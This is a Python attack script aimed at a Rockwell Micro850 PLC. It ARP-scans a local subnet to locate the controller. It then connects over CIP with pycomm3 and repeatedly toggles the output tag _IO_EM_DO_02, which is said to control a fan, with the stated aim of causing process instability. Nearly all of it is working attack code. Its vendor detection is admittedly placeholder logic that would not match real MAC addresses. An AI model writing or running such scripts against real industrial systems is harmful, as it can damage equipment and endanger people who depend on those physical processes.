from pycomm3 import CIPDriver
from scapy.all import ARP, Ether, srp
import time

# Function to scan the network and find the PLC's IP
def find_plc_ip(network_prefix="192.168.1.0/24"):
    print("[*] Scanning network for Rockwell Micro850 PLC...")
    
    # Create an ARP request to detect active devices
    arp_request = ARP(pdst=network_prefix)
    broadcast_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast_frame / arp_request
    
    # Send the request and collect answers
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    for sent, received in answered_list:
        print(f"[+] Device Found: IP={received.psrc} MAC={received.hwsrc}")
        
        # Identify Rockwell PLC by checking vendor details
        if "Rockwell" in received.hwsrc:  # Placeholder logic for vendor check
            print(f"[*] Rockwell PLC Found at {received.psrc}")
            return received.psrc
    
    print("[!] No Rockwell PLC found in the network.")
    return None


# Function to perform brute force I/O attack 
def brute_force_io(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip}...")

    try:
        # Establish a CIP connection with the Micro850 PLC
        with CIPDriver(plc_ip) as plc:
            if plc.connected:
                print("[+] Connected to PLC!")

                # Target I/O Point: _IO_EM_DO_02, which controls FanA
                tag_name = "_IO_EM_DO_02"
                
                # Brute force the I/O point for 100 iterations
                for i in range(100):
                    # Toggle between ON and OFF
                    new_value = (i % 2 == 0)  # True on even, False on odd iterations
                    plc.write_tag(tag_name, new_value)
                    
                    print(f"[!] Brute Force: Setting {tag_name} = {new_value}")
                    time.sleep(0.5)  # Short interval to cause process instability

            else:
                print("[!] Could not connect to PLC.")

    except Exception as e:
        print(f"[ERROR] Communication failed: {e}")

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip("192.168.1.0/24")  # Use the correct subnet for your network
    if plc_ip:
        brute_force_io(plc_ip)
    else:
        print("[!] Exiting - No PLC found.")